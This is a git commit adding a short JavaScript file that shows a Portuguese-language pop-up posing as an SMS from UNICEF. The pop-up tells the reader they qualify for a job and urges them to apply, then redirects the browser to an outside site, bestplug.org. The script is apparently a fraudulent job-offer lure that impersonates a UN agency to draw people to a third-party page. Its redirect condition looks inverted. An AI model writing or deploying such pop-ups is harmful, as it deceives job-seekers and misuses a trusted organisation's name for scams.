2d80485720026290cee0a56c2441fe6c5bbc79d3
vibeblog <enom02567@gmail.com>
2025-05-01 07:14:07 +0100

    Create unicef-mz-active.js

---
+++ unicef-mz-active.js
@@ -0,0 +1,5 @@
+var password = 'INSCREVA-SE AGORA'
+password=prompt('SMS: Parabéns, você está qualificado para trabalhar no FUNDO DAS NAÇÕES UNIDAS PARA A INFÂNCIA (UNICEF), clique em Ok, envie sua inscrição agora ','INSCREVA-SE AGORA');
+if (password != 'INSCREVA-SE AGORA') {
+location.href='https://bestplug.org/unicef-jobs.html';
+}
